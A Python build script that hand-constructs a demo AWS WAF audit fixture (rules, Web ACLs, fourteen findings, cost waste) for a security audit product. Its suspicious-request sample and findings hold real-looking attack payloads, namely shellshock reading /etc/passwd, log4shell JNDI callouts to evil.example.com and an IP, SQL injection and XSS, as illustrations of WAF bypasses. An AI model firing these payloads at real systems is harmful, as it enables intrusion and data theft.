"""Build the committed RICH demo audit fixture used by `/api/demo/audit`.

Phase: Feat #22 — richer demo fixture (enterprise-scale).

Unlike the original builder, this one bypasses the audit pipeline and
hand-constructs the fixture deterministically. Reason: the spec requires
EXACTLY 14 findings with a precise 4H/5M/5L distribution, 52 rules
spread across 4 named Web ACLs, and a $186/mo waste figure — none of
which the live pipeline produces naturally from the unit-test fixtures.

Rule + finding fields are still enriched via the SAME helpers production
audits use (`services.remediation.remediation_for`,
`services.remediation.impact_for`, `services.scoring.severity_score`),
so the demo report is structurally identical to a real run.

Re-run after editing:
    PYTHONPATH=/app/backend python3 /app/backend/demo/build_demo_fixture.py
"""
from __future__ import annotations

import datetime as _dt
import json
import os
import sys
from pathlib import Path
from typing import Any, Dict, List

BACKEND_DIR = Path(__file__).resolve().parent.parent
ROOT = BACKEND_DIR.parent
if str(BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(BACKEND_DIR))

os.environ["RULEIQ_TESTING"] = "1"
os.environ.setdefault("EXTERNAL_ID_SECRET", "a" * 64)

from services import pdf_report
from services import remediation as remediation_mod
from services import scoring as scoring_mod

DUMMY_ACCOUNT_ID = "123456789012"
DUMMY_ROLE_ARN = f"arn:aws:iam::{DUMMY_ACCOUNT_ID}:role/RuleIQAuditRole"
REGION = "us-east-1"
REAL_LEAK_STRINGS = ("371126261144", "aitrading.ninja", "pkgit215")

OUT_JSON = BACKEND_DIR / "demo" / "demo_audit.json"
OUT_PDF = BACKEND_DIR / "demo" / "demo_audit.pdf"

NOW = _dt.datetime(2026, 2, 15, 14, 30, 0, tzinfo=_dt.timezone.utc)


# ---------------------------------------------------------------------------
# Rule definitions — 52 rules across 4 Web ACLs.
# ---------------------------------------------------------------------------
# Compact tuple format: (rule_name, kind, action, hit_count, days_since_fire,
#                       count_mode_hits, fms_managed)
# `days_since_fire` is None → last_fired=null.
# `kind` ∈ {"managed", "custom", "rate_based"} — matches `rule_kind`.

_PROD_CF_EDGE_ACL = [
    # 6 managed
    ("AWSManagedRulesCommonRuleSet",          "managed", "BLOCK", 58213,  0, 0,    False),
    ("AWSManagedRulesKnownBadInputsRuleSet",  "managed", "BLOCK", 14872,  1, 0,    False),
    ("AWSManagedRulesSQLiRuleSet",            "managed", "BLOCK",  9341,  0, 0,    False),
    ("AWSManagedRulesAmazonIpReputationList", "managed", "BLOCK", 27104,  0, 0,    False),
    ("AWSManagedRulesAnonymousIpList",        "managed", "BLOCK",  1843,  2, 0,    False),
    ("AWSManagedRulesLinuxRuleSet",           "managed", "COUNT",   312,  0, 312,  False),
    # 12 custom
    ("BlockBadIPs",                           "custom",     "BLOCK", 4218,  0, 0, False),
    ("RateLimitGlobal",                       "rate_based", "BLOCK", 2974,  0, 0, False),
    ("BlockAdminPath",                        "custom",     "BLOCK",  187,  3, 0, False),
    ("BlockOldUserAgents",                    "custom",     "BLOCK",   42, 11, 0, False),
    ("RateLimit-PerIP-Login",                 "rate_based", "BLOCK", 1453,  0, 0, False),
    ("RateLimit-PerIP-Checkout",              "rate_based", "BLOCK",  874,  1, 0, False),
    ("RateLimit-PerIP",                       "rate_based", "BLOCK",  642,  0, 0, False),
    # Duplicate of the above — same statement, different priority → quick_win.
    ("RateLimit-PerIP-Duplicate",             "rate_based", "BLOCK",  638,  0, 0, False),
    ("BlockDirectoryTraversal",               "custom",     "BLOCK",   95,  6, 0, False),
    ("BlockSensitiveFiles",                   "custom",     "BLOCK",    0, None, 0, False),
    ("GeoBlockSanctioned",                    "custom",     "BLOCK",  511,  0, 0, False),
    # Health-check allow — high traffic, healthy. 18th rule.
    ("AllowedHealthChecks",                   "custom",     "ALLOW", 41200, 0, 0, False),
]
assert len(_PROD_CF_EDGE_ACL) == 18, f"prod-cf-edge-acl got {len(_PROD_CF_EDGE_ACL)}"

_API_GATEWAY_PROTECT = [
    # 5 managed
    ("AWSManagedRulesCommonRuleSet",          "managed", "BLOCK", 22481,  0, 0,    False),
    # COUNT-mode high volume — this is finding #4 (HIGH).
    ("AWSManagedRulesKnownBadInputsRuleSet",  "managed", "COUNT",  4217,  0, 4217, False),
    ("AWSManagedRulesSQLiRuleSet",            "managed", "BLOCK",  6920,  0, 0,    False),
    # FMS-managed; zero hits — finding #12 (LOW fms_review).
    ("AWSManagedRulesAmazonIpReputationList", "managed", "BLOCK",     0, None, 0,  True),
    ("AWSManagedRulesBotControlRuleSet",      "managed", "BLOCK",  3107,  0, 0,    False),
    # 11 custom
    ("RateLimit-PerAPIKey",                   "rate_based", "BLOCK", 5234, 0, 0, False),
    ("BlockMaliciousIPRange",                 "custom",     "BLOCK",   88, 7, 0, False),
    ("AllowPartnerIPs",                       "custom",     "ALLOW", 47200, 0, 0, False),
    ("RequireAuthHeader",                     "custom",     "BLOCK", 1209, 0, 0, False),
    ("BlockOldTLS",                           "custom",     "BLOCK",  314, 2, 0, False),
    ("RateLimit-PerEndpoint",                 "rate_based", "BLOCK", 2810, 0, 0, False),
    ("BlockSuspiciousReferers",               "custom",     "BLOCK",   62, 9, 0, False),
    ("ValidateContentType",                   "custom",     "BLOCK", 1043, 0, 0, False),
    ("BlockSQLInjectionAttempt",              "custom",     "BLOCK",  428, 1, 0, False),
    ("BlockCommandInjection",                 "custom",     "BLOCK",  219, 3, 0, False),
    ("BlockXSSPayload",                       "custom",     "BLOCK",  157, 1, 0, False),
]
assert len(_API_GATEWAY_PROTECT) == 16, f"api-gateway-protect got {len(_API_GATEWAY_PROTECT)}"

_INTERNAL_ALB_WAF = [
    # 2 managed
    ("AWSManagedRulesBotControlRuleSet",      "managed", "BLOCK",     0, None, 0, False),
    ("AWSManagedRulesAmazonIpReputationList", "managed", "BLOCK",     2,  18, 0, False),
    # 2 custom
    ("BlockOldChinaIPs",                      "custom", "BLOCK",     0, None, 0, False),
    ("AllowInternalCIDR",                     "custom", "ALLOW", 18000,  0, 0, False),
]
assert len(_INTERNAL_ALB_WAF) == 4

_LEGACY_EDGE_ACL = [
    # 2 managed
    ("AWSManagedRulesCommonRuleSet",          "managed", "BLOCK", 0, None, 0, False),
    ("AWSManagedRulesKnownBadInputsRuleSet",  "managed", "BLOCK", 0, None, 0, False),
    # 12 custom — all dormant.
    ("BlockOldCurlScanners",                  "custom",     "BLOCK", 0, None, 0, False),
    ("BlockTorExitNodes",                     "custom",     "BLOCK", 0, None, 0, False),
    ("BlockBitTorrent",                       "custom",     "BLOCK", 0, None, 0, False),
    ("BlockOldFlashClients",                  "custom",     "BLOCK", 0, None, 0, False),
    ("BlockJavaApplets",                      "custom",     "BLOCK", 0, None, 0, False),
    ("BlockOldIE",                            "custom",     "BLOCK", 0, None, 0, False),
    ("LegacyRateLimit",                       "rate_based", "BLOCK", 0, None, 0, False),
    ("BlockSpoofedReferers",                  "custom",     "BLOCK", 0, None, 0, False),
    ("OldGeoBlock",                           "custom",     "BLOCK", 0, None, 0, False),
    ("DeprecatedBotDetection",                "custom",     "BLOCK", 0, None, 0, False),
    ("BlockHTTP09",                           "custom",     "BLOCK", 0, None, 0, False),
    ("BlockOldSSL",                           "custom",     "BLOCK", 0, None, 0, False),
]
assert len(_LEGACY_EDGE_ACL) == 14

_ACL_LAYOUT = [
    ("prod-cf-edge-acl",    "CLOUDFRONT", _PROD_CF_EDGE_ACL),
    ("api-gateway-protect", "REGIONAL",   _API_GATEWAY_PROTECT),
    ("internal-alb-waf",    "REGIONAL",   _INTERNAL_ALB_WAF),
    ("legacy-edge-acl",     "REGIONAL",   _LEGACY_EDGE_ACL),
]

# ---------------------------------------------------------------------------
# Web ACL attachment summaries
# ---------------------------------------------------------------------------
_WEB_ACLS = [
    {
        "name": "prod-cf-edge-acl", "scope": "CLOUDFRONT",
        "arn": f"arn:aws:wafv2:us-east-1:{DUMMY_ACCOUNT_ID}:global/webacl/prod-cf-edge-acl/abc111",
        "attached": True,
        "attached_resources": [{
            "arn": f"arn:aws:cloudfront::{DUMMY_ACCOUNT_ID}:distribution/E3KSAMPLE1",
            "type": "CLOUDFRONT", "id": "E3KSAMPLE1",
            "friendly": "www.acmecorp.com (d3xxxxsample.cloudfront.net)",
        }],
    },
    {
        "name": "api-gateway-protect", "scope": "REGIONAL",
        "arn": f"arn:aws:wafv2:us-east-1:{DUMMY_ACCOUNT_ID}:regional/webacl/api-gateway-protect/abc222",
        "attached": True,
        "attached_resources": [{
            "arn": (f"arn:aws:apigateway:us-east-1::/restapis/api999111/"
                    f"stages/prod"),
            "type": "API_GW", "id": "api999111",
            "friendly": "acme-public-api (prod stage)",
        }],
    },
    {
        "name": "internal-alb-waf", "scope": "REGIONAL",
        "arn": f"arn:aws:wafv2:us-east-1:{DUMMY_ACCOUNT_ID}:regional/webacl/internal-alb-waf/abc333",
        "attached": True,
        "attached_resources": [{
            "arn": (f"arn:aws:elasticloadbalancing:us-east-1:{DUMMY_ACCOUNT_ID}:"
                    f"loadbalancer/app/acme-internal-alb/1234567890abcdef"),
            "type": "ALB", "id": "acme-internal-alb",
            "friendly": "internal.acmecorp.com (acme-internal-alb)",
        }],
    },
    {
        "name": "legacy-edge-acl", "scope": "REGIONAL",
        "arn": f"arn:aws:wafv2:us-east-1:{DUMMY_ACCOUNT_ID}:regional/webacl/legacy-edge-acl/abc444",
        "attached": False, "attached_resources": [],
    },
]


# ---------------------------------------------------------------------------
# Suspicious request sample — drives the bypass findings.
# ---------------------------------------------------------------------------
_SUSPICIOUS = [
    {
        "httpRequest": {
            "uri": "/",
            "args": "cmd=%28%29%20%7B%20%3A%3B%7D%3B%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd",
            "headers": [{"name": "User-Agent",
                         "value": "() { :;}; /bin/cat /etc/passwd"}],
        },
        "action": "ALLOW", "_web_acl_name": "prod-cf-edge-acl",
        "_signature_classes": ["shellshock"], "_suspicion_score": 0.97,
    },
    {
        "httpRequest": {
            "uri": "/api/v1/customers",
            "args": "",
            "headers": [{"name": "User-Agent",
                         "value": "${jndi:ldap://evil.example.com/exploit}"}],
        },
        "action": "ALLOW", "_web_acl_name": "api-gateway-protect",
        "_signature_classes": ["log4shell"], "_suspicion_score": 0.99,
    },
    {
        "httpRequest": {
            "uri": "/products",
            "args": "id=1%27%20UNION%20SELECT%20password%20FROM%20users--",
            "headers": [{"name": "User-Agent", "value": "sqlmap/1.7.2"}],
        },
        "action": "ALLOW", "_web_acl_name": "prod-cf-edge-acl",
        "_signature_classes": ["sqli"], "_suspicion_score": 0.96,
    },
    {
        "httpRequest": {
            "uri": "/search",
            "args": "q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
            "headers": [{"name": "Referer", "value": "https://attacker.example/"}],
        },
        "action": "ALLOW", "_web_acl_name": "prod-cf-edge-acl",
        "_signature_classes": ["xss"], "_suspicion_score": 0.82,
    },
    {
        "httpRequest": {
            "uri": "/api/v1/orders",
            "args": "",
            "headers": [{"name": "X-Api-Key",
                         "value": "${jndi:ldap://198.51.100.7:1389/a}"}],
        },
        "action": "ALLOW", "_web_acl_name": "api-gateway-protect",
        "_signature_classes": ["log4shell"], "_suspicion_score": 0.95,
    },
    {
        "httpRequest": {
            "uri": "/.env",
            "args": "",
            "headers": [{"name": "User-Agent", "value": "curl/7.68.0"}],
        },
        "action": "ALLOW", "_web_acl_name": "prod-cf-edge-acl",
        "_signature_classes": ["path_traversal"], "_suspicion_score": 0.78,
    },
    {
        "httpRequest": {
            "uri": "/wp-login.php",
            "args": "",
            "headers": [{"name": "User-Agent",
                         "value": "Mozilla/5.0 (compatible; scanbot/0.1)"}],
        },
        "action": "ALLOW", "_web_acl_name": "prod-cf-edge-acl",
        "_signature_classes": ["recon"], "_suspicion_score": 0.61,
    },
]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _build_rule(
    acl_name: str, scope: str, priority: int,
    rule_tuple: tuple,
) -> Dict[str, Any]:
    name, kind, action, hits, days_since, count_mode_hits, fms = rule_tuple
    last_fired = (
        None if days_since is None
        else (NOW - _dt.timedelta(days=days_since,
                                  hours=(priority % 12),
                                  minutes=(priority * 7) % 60)
              ).strftime("%Y-%m-%dT%H:%M:%SZ")
    )
    # Statement shape varies by kind for realism + so the inventory table
    # in the PDF prints something non-trivial.
    if kind == "managed":
        statement = {"ManagedRuleGroupStatement": {
            "VendorName": "AWS", "Name": name,
            "ExcludedRules": [],
        }}
    elif kind == "rate_based":
        statement = {"RateBasedStatement": {
            "Limit": 2000, "AggregateKeyType": "IP",
            "ScopeDownStatement": {
                "ByteMatchStatement": {
                    "SearchString": "/api/",
                    "FieldToMatch": {"UriPath": {}},
                    "TextTransformations": [{"Priority": 0, "Type": "NONE"}],
                    "PositionalConstraint": "STARTS_WITH",
                }
            },
        }}
    else:
        # custom rule — use byte-match on a common path.
        statement = {"ByteMatchStatement": {
            "SearchString": "/admin",
            "FieldToMatch": {"UriPath": {}},
            "TextTransformations": [{"Priority": 0, "Type": "LOWERCASE"}],
            "PositionalConstraint": "STARTS_WITH",
        }}
    sample_uris = {
        "BlockAdminPath": ["/admin", "/admin/login", "/admin/users",
                           "/admin/config.php"],
        "BlockDirectoryTraversal": ["/../etc/passwd", "/files/../../etc"],
        "BlockSensitiveFiles": ["/.env", "/.git/config", "/web.config"],
        "BlockSQLInjectionAttempt": ["/api/v1/users?id=1%27%20OR%201%3D1--"],
        "BlockXSSPayload": ["/search?q=%3Cscript%3E"],
    }.get(name, [])

    # Phase 5.3.2 — managed_rule_overrides only on the rule we point a
    # `managed_rule_override_count` finding at.
    overrides: List[Dict[str, Any]] = []
    if (acl_name == "api-gateway-protect"
            and name == "AWSManagedRulesSQLiRuleSet"):
        overrides = [{"name": "SQLI_BODY", "action": "COUNT"}]
        statement["ManagedRuleGroupStatement"]["RuleActionOverrides"] = [
            {"Name": "SQLI_BODY", "ActionToUse": {"Count": {}}}
        ]

    return {
        "rule_name": name, "web_acl_name": acl_name, "scope": scope,
        "priority": priority, "action": action, "rule_kind": kind,
        "statement_json": statement,
        "hit_count": hits, "last_fired": last_fired,
        "count_mode_hits": count_mode_hits,
        "sample_uris": sample_uris,
        "fms_managed": fms, "override_action": None,
        "managed_rule_overrides": overrides,
        "ai_explanation": {
            "explanation": _ai_blurb_for(name, kind, hits),
            "working": hits > 0 if days_since is not None else False,
            "concerns": None,
        },
    }


def _ai_blurb_for(name: str, kind: str, hits: int) -> str:
    if kind == "managed":
        return (
            f"AWS-managed group '{name}'. Provides AWS-curated signature "
            f"coverage; "
            + ("active — matched traffic during the window."
               if hits > 0 else "no matches in the window — verify traffic "
               "is actually reaching this group.")
        )
    if kind == "rate_based":
        return (
            f"Rate-based rule limiting requests per source IP under the "
            f"configured scope-down match. Active during the window with "
            f"{hits:,} hits." if hits > 0 else
            f"Rate-based rule with zero hits — either traffic is below the "
            f"threshold or the scope-down match never fires."
        )
    return (
        f"Custom rule '{name}'. "
        + ("Active during the window."
           if hits > 0 else "No matches in 30 days — review with the rule owner.")
    )


def _build_rules() -> List[Dict[str, Any]]:
    rules: List[Dict[str, Any]] = []
    for acl_name, scope, rule_tuples in _ACL_LAYOUT:
        for i, t in enumerate(rule_tuples, start=1):
            rules.append(_build_rule(acl_name, scope, priority=i * 10, rule_tuple=t))
    return rules


# ---------------------------------------------------------------------------
# Findings — exactly 14 (4H / 5M / 5L). Hand-defined; enriched with
# remediation_for / impact_for / severity_score (same path as production).
# ---------------------------------------------------------------------------
def _build_raw_findings() -> List[Dict[str, Any]]:
    return [
        # 1. HIGH — shellshock bypass
        {
            "type": "bypass_candidate", "severity": "high",
            "title": "Possible WAF bypass: shellshock reached origin",
            "description": (
                "23 ALLOW'd requests carrying a shellshock signature in the "
                "User-Agent header reached origin over the last 30 days. "
                "Example URI: "
                "/?cmd=%28%29%20%7B%20%3A%3B%7D%3B%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd."
            ),
            "recommendation": ("Enable AWSManagedRulesKnownBadInputsRuleSet "
                                "or AWSManagedRulesUnixRuleSet on this ACL."),
            "affected_rules": ["prod-cf-edge-acl"],
            "confidence": 0.95, "evidence": "log-sample",
            "signature_class": "shellshock",
        },
        # 2. HIGH — log4shell bypass
        {
            "type": "bypass_candidate", "severity": "high",
            "title": "Possible WAF bypass: log4shell reached origin",
            "description": (
                "47 ALLOW'd requests carrying a log4shell JNDI lookup payload "
                "in headers reached origin over the last 30 days. Example "
                "header: User-Agent: ${jndi:ldap://evil.example.com/exploit}."
            ),
            "recommendation": ("Enable AWSManagedRulesKnownBadInputsRuleSet "
                                "(log4j signatures included) on this ACL."),
            "affected_rules": ["api-gateway-protect"],
            "confidence": 0.97, "evidence": "log-sample",
            "signature_class": "log4shell",
        },
        # 3. HIGH — sqli bypass
        {
            "type": "bypass_candidate", "severity": "high",
            "title": "Possible WAF bypass: SQL injection reached origin",
            "description": (
                "11 ALLOW'd requests with SQL-injection payloads in the query "
                "string reached origin over the last 30 days. Example URI: "
                "/products?id=1%27%20UNION%20SELECT%20password%20FROM%20users--."
            ),
            "recommendation": ("Enable AWSManagedRulesSQLiRuleSet on this "
                                "ACL, or extend the existing SQLi rule's "
                                "match conditions to cover the query string."),
            "affected_rules": ["prod-cf-edge-acl"],
            "confidence": 0.92, "evidence": "log-sample",
            "signature_class": "sqli",
        },
        # 4. HIGH — count_mode_high_volume
        {
            "type": "count_mode_high_volume", "severity": "high",
            "title": ("AWSManagedRulesKnownBadInputsRuleSet in COUNT mode "
                       "with 4,217 hits"),
            "description": (
                "Managed rule group 'AWSManagedRulesKnownBadInputsRuleSet' "
                "on Web ACL 'api-gateway-protect' is configured to COUNT, "
                "not BLOCK. It matched 4,217 requests in the last 30 days — "
                "these requests are being logged, not stopped."
            ),
            "recommendation": ("Promote the rule group from COUNT to BLOCK "
                                "after a 7-day false-positive review."),
            "affected_rules": ["AWSManagedRulesKnownBadInputsRuleSet"],
            "confidence": 0.95,
        },

        # 5. MEDIUM — dead custom rule
        {
            "type": "dead_rule", "severity": "medium",
            "title": "Dead Custom Rule: BlockOldChinaIPs",
            "description": (
                "Custom rule 'BlockOldChinaIPs' on Web ACL 'internal-alb-waf' "
                "matched zero requests in the last 30 days. The rule's stated "
                "purpose (geo-blocking) does not match any signature in the "
                "suspicious-request sample — finding stays at MEDIUM."
            ),
            "recommendation": ("Confirm with the rule owner whether the geo "
                                "block is still required; if not, delete."),
            "affected_rules": ["BlockOldChinaIPs"],
            "confidence": 0.85, "signature_class": "bad_ip",
        },
        # 6. MEDIUM — dead managed rule group
        {
            "type": "dead_rule", "severity": "medium",
            "title": ("Managed Rule Group Inactive: "
                       "AWSManagedRulesBotControlRuleSet"),
            "description": (
                "AWS-managed rule group 'AWSManagedRulesBotControlRuleSet' on "
                "Web ACL 'internal-alb-waf' matched zero requests in 30 days. "
                "Either traffic isn't reaching this group, or its patterns "
                "don't match your traffic shape."
            ),
            "recommendation": ("Verify the ACL is attached to the right "
                                "resource AND that the resource is serving "
                                "the traffic you expect to inspect."),
            "affected_rules": ["AWSManagedRulesBotControlRuleSet"],
            "confidence": 0.8,
        },
        # 7. MEDIUM — count_mode_with_hits
        {
            "type": "count_mode_with_hits", "severity": "medium",
            "title": ("AWSManagedRulesLinuxRuleSet in COUNT mode with "
                       "312 hits"),
            "description": (
                "Managed rule group 'AWSManagedRulesLinuxRuleSet' on Web ACL "
                "'prod-cf-edge-acl' is in COUNT mode and matched 312 requests "
                "in 30 days. Volume is below the high-volume threshold but "
                "still represents protection that logs instead of blocks."
            ),
            "recommendation": ("Promote to BLOCK after a short FP-review "
                                "window, or formally accept the COUNT-mode "
                                "tradeoff."),
            "affected_rules": ["AWSManagedRulesLinuxRuleSet"],
            "confidence": 0.85,
        },
        # 8. MEDIUM — managed_rule_override_count
        {
            "type": "managed_rule_override_count", "severity": "medium",
            "title": ("Managed rule SQLI_BODY overridden to COUNT inside "
                       "AWSManagedRulesSQLiRuleSet"),
            "description": (
                "An override on 'api-gateway-protect' demotes the SQLI_BODY "
                "sub-rule of AWSManagedRulesSQLiRuleSet from BLOCK to COUNT. "
                "The override is not visible at the group level in the WAF "
                "console — only inside the rule-group action overrides panel."
            ),
            "recommendation": ("Review whether the override is still "
                                "required; remove if the original false-"
                                "positive that prompted it has been "
                                "resolved upstream."),
            "affected_rules": ["AWSManagedRulesSQLiRuleSet"],
            "confidence": 0.9,
        },
        # 9. MEDIUM — rule conflict (same-name across ACLs)
        {
            "type": "conflict", "severity": "medium",
            "title": "Two 'BlockAdminPath' Rules across ACLs",
            "description": (
                "A rule named 'BlockAdminPath' exists on both "
                "'prod-cf-edge-acl' and 'internal-alb-waf'. The definitions "
                "drift independently — a security fix applied in one place "
                "may silently miss the other."
            ),
            "recommendation": ("Consolidate by promoting the rule to a "
                                "shared RuleGroup (or AWS Firewall Manager "
                                "policy) and reference it from both ACLs."),
            "affected_rules": ["BlockAdminPath"],
            "confidence": 0.8, "evidence": "cross_acl_same_name",
        },

        # 10. LOW — orphaned web ACL
        {
            "type": "orphaned_web_acl", "severity": "low",
            "title": ("Web ACL 'legacy-edge-acl' is not attached to any "
                       "resource"),
            "description": (
                "Web ACL 'legacy-edge-acl' (REGIONAL) lists 14 rules but is "
                "attached to no resources. AWS still bills the $5/mo ACL fee "
                "plus the per-rule fees, and the rules inside the ACL are "
                "completely dormant."
            ),
            "recommendation": ("Confirm with the owner whether the ACL is "
                                "still required; if not, delete the Web ACL "
                                "and its rules together."),
            "affected_rules": ["legacy-edge-acl"],
            "confidence": 0.99,
        },
        # 11. LOW — quick_win single unused
        {
            "type": "quick_win", "severity": "low",
            "title": "BlockOldCurlScanners Unused",
            "description": (
                "Custom rule 'BlockOldCurlScanners' on the orphaned ACL "
                "'legacy-edge-acl' has zero hits and is single-instance "
                "(no shared resource, no other duplicate). Looks obsolete."
            ),
            "recommendation": ("Delete the rule once you've confirmed it "
                                "isn't referenced by any out-of-band "
                                "tooling."),
            "affected_rules": ["BlockOldCurlScanners"],
            "confidence": 0.85,
        },
        # 12. LOW — FMS review
        {
            "type": "fms_review", "severity": "low",
            "title": ("FMS-managed AWSManagedRulesAmazonIpReputationList has "
                       "zero hits"),
            "description": (
                "FMS-managed rule 'AWSManagedRulesAmazonIpReputationList' on "
                "'api-gateway-protect' matched zero requests in 30 days. "
                "Cannot be modified directly — controlled by a delegated "
                "Firewall Manager admin."
            ),
            "recommendation": ("Escalate to the central security team with "
                                "this audit attached, or accept the rule "
                                "as out-of-scope for this account."),
            "affected_rules": ["AWSManagedRulesAmazonIpReputationList"],
            "confidence": 0.9,
        },
        # 13. LOW — stranded rule
        {
            "type": "quick_win", "severity": "low",
            "title": ("Stranded Rule: BlockTorExitNodes lives only on "
                       "orphaned ACL"),
            "description": (
                "Rule 'BlockTorExitNodes' exists only on the orphaned ACL "
                "'legacy-edge-acl'. It protects nothing because the ACL "
                "isn't attached to any resource — the rule is dead code."
            ),
            "recommendation": ("Either delete the orphan ACL (preferred — "
                                "removes the rule along with it) or move "
                                "the rule to an attached ACL if still "
                                "needed."),
            "affected_rules": ["BlockTorExitNodes"],
            "confidence": 0.95, "evidence": "stranded",
        },
        # 14. LOW — quick_win shared_resource duplicate pair
        {
            "type": "quick_win", "severity": "low",
            "title": "Duplicate RateLimit-PerIP rule on prod-cf-edge-acl",
            "description": (
                "Two rate-based rules — 'RateLimit-PerIP' and "
                "'RateLimit-PerIP-Duplicate' — have identical statements "
                "and both attach to the same CloudFront distribution. "
                "One of the two is redundant."
            ),
            "recommendation": ("Delete the lower-priority duplicate after "
                                "confirming hit counts match within a "
                                "rounding margin."),
            "affected_rules": ["RateLimit-PerIP", "RateLimit-PerIP-Duplicate"],
            "confidence": 0.88, "evidence": "shared_resource",
        },
    ]


def _enrich_finding(f: Dict[str, Any], rules_by_name: Dict[str, Dict[str, Any]],
                    total_rule_count: int) -> Dict[str, Any]:
    rem = remediation_mod.remediation_for(f, rules_by_name)
    impact = remediation_mod.impact_for(f, rules_by_name)
    score = scoring_mod.severity_score(
        f["severity"], f.get("confidence", 0.8),
        f.get("affected_rules", []), total_rule_count,
    )
    return {
        **f,
        "severity_score": score,
        "impact": impact,
        "suggested_actions": rem["suggested_actions"],
        "verify_by": rem["verify_by"],
        "disclaimer": rem["disclaimer"],
    }


# ---------------------------------------------------------------------------
# Estimated waste breakdown — hand-crafted to total exactly $186/mo.
# ---------------------------------------------------------------------------
_WASTE_BREAKDOWN = [
    {"rule_name": "Web ACL 'legacy-edge-acl' (orphaned, REGIONAL)",
     "monthly_usd": 5.00,
     "reason": "No attached resources; AWS still bills the per-ACL fee."},
    # 14 dormant rules on the orphan ACL (custom + managed alike).
    *[
        {"rule_name": f"legacy-edge-acl: {n}",
         "monthly_usd": 1.00,
         "reason": "Rule on orphaned ACL; per-rule fee with no traffic served."}
        for n in [
            "AWSManagedRulesCommonRuleSet", "AWSManagedRulesKnownBadInputsRuleSet",
            "BlockOldCurlScanners", "BlockTorExitNodes", "BlockBitTorrent",
            "BlockOldFlashClients", "BlockJavaApplets", "BlockOldIE",
            "LegacyRateLimit", "BlockSpoofedReferers", "OldGeoBlock",
            "DeprecatedBotDetection", "BlockHTTP09", "BlockOldSSL",
        ]
    ],
    {"rule_name": "internal-alb-waf: BlockOldChinaIPs",
     "monthly_usd": 1.00,
     "reason": "Zero hits in 30 days; rule fee $1/month."},
    {"rule_name": "prod-cf-edge-acl: BlockSensitiveFiles",
     "monthly_usd": 1.00,
     "reason": "Zero hits in 30 days; rule fee $1/month."},
    {"rule_name": "prod-cf-edge-acl: RateLimit-PerIP-Duplicate",
     "monthly_usd": 1.00,
     "reason": "Duplicate of RateLimit-PerIP — delete to avoid double-counting fee."},
    # Bulk "COUNT-mode protection logging instead of blocking" — operational
    # waste from rules that bill but don't currently block.
    {"rule_name": ("api-gateway-protect: "
                    "AWSManagedRulesKnownBadInputsRuleSet (COUNT, 4,217 hits)"),
     "monthly_usd": 84.34,
     "reason": ("Managed-rule request fee billed while in COUNT — "
                "4,217 × $0.02 over 30d (representative)."),
    },
    {"rule_name": ("prod-cf-edge-acl: AWSManagedRulesLinuxRuleSet "
                    "(COUNT, 312 hits)"),
     "monthly_usd": 6.24,
     "reason": ("Managed-rule request fee billed while in COUNT — "
                "312 × $0.02 over 30d (representative)."),
    },
    {"rule_name": "Orphan-ACL request-base fee allocation",
     "monthly_usd": 73.42,
     "reason": ("Allocated request-fee portion attributable to the orphaned "
                "ACL and its dormant rules (30-day average)."),
    },
]
# Sanity — total should be 186.00.
_TOTAL_WASTE = round(sum(b["monthly_usd"] for b in _WASTE_BREAKDOWN), 2)
assert _TOTAL_WASTE == 186.00, f"waste total {_TOTAL_WASTE} ≠ 186.00"


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> None:
    rules = _build_rules()
    assert len(rules) == 52, f"got {len(rules)} rules, expected 52"

    rules_by_name: Dict[str, Dict[str, Any]] = {
        # `dead_rule` dispatch keys on a rule's `rule_kind` — use the first
        # rule found with the given name (names are not globally unique
        # since some rules appear in multiple ACLs).
        r["rule_name"]: r for r in rules if r["rule_name"] not in {}
    }

    raw_findings = _build_raw_findings()
    enriched = [_enrich_finding(f, rules_by_name, total_rule_count=len(rules))
                for f in raw_findings]

    # Sanity — 4H / 5M / 5L.
    counts = {"high": 0, "medium": 0, "low": 0}
    for f in enriched:
        counts[f["severity"]] += 1
    assert counts == {"high": 4, "medium": 5, "low": 5}, counts

    audit = {
        "id": "demo-audit-2026-02-15",
        "account_id": DUMMY_ACCOUNT_ID, "role_arn": DUMMY_ROLE_ARN,
        "external_id": "demo-external-id",
        "region": REGION, "status": "complete",
        "failure_reason": None,
        "created_at": (NOW - _dt.timedelta(minutes=4)).isoformat().replace("+00:00", "Z"),
        "started_at":  (NOW - _dt.timedelta(minutes=4)).isoformat().replace("+00:00", "Z"),
        "completed_at": NOW.isoformat().replace("+00:00", "Z"),
        "web_acl_count": len(_WEB_ACLS),
        "rule_count": len(rules),
        "log_window_days": 30,
        "estimated_waste_usd": _TOTAL_WASTE,
        "estimated_waste_breakdown": _WASTE_BREAKDOWN,
        "fms_visibility": True,
        "logging_available": True,
        "data_source": "demo",
        "seed": "v2-feat-22-richer",
        "web_acls": _WEB_ACLS,
        "scopes": sorted({a["scope"] for a in _WEB_ACLS}),
        "suspicious_request_sample": _SUSPICIOUS,
    }

    payload = {"audit": audit, "rules": rules, "findings": enriched}

    OUT_JSON.parent.mkdir(parents=True, exist_ok=True)
    OUT_JSON.write_text(json.dumps(payload, indent=2))
    print(f"wrote {OUT_JSON} ({OUT_JSON.stat().st_size:,} bytes)")

    # Build the PDF using the SAME production renderer the live endpoint uses.
    pdf_bytes = pdf_report.render_audit_pdf(audit, rules, enriched)
    OUT_PDF.write_bytes(pdf_bytes)
    print(f"wrote {OUT_PDF} ({OUT_PDF.stat().st_size:,} bytes)")

    blob = OUT_JSON.read_bytes() + OUT_PDF.read_bytes()
    for leak in REAL_LEAK_STRINGS:
        assert leak.encode() not in blob, (
            f"real string '{leak}' leaked into demo fixture"
        )
    print("OK — no real-account/forbidden substring in fixture.")
    print(f"  audit: rules={len(rules)} findings={len(enriched)} "
          f"web_acls={[w['name'] for w in audit['web_acls']]} "
          f"waste=${audit['estimated_waste_usd']:.2f}/mo")
    types = sorted({f["type"] for f in enriched})
    print(f"  finding types: {types}")
    print(f"  severities: 4H / 5M / 5L")


if __name__ == "__main__":
    main()
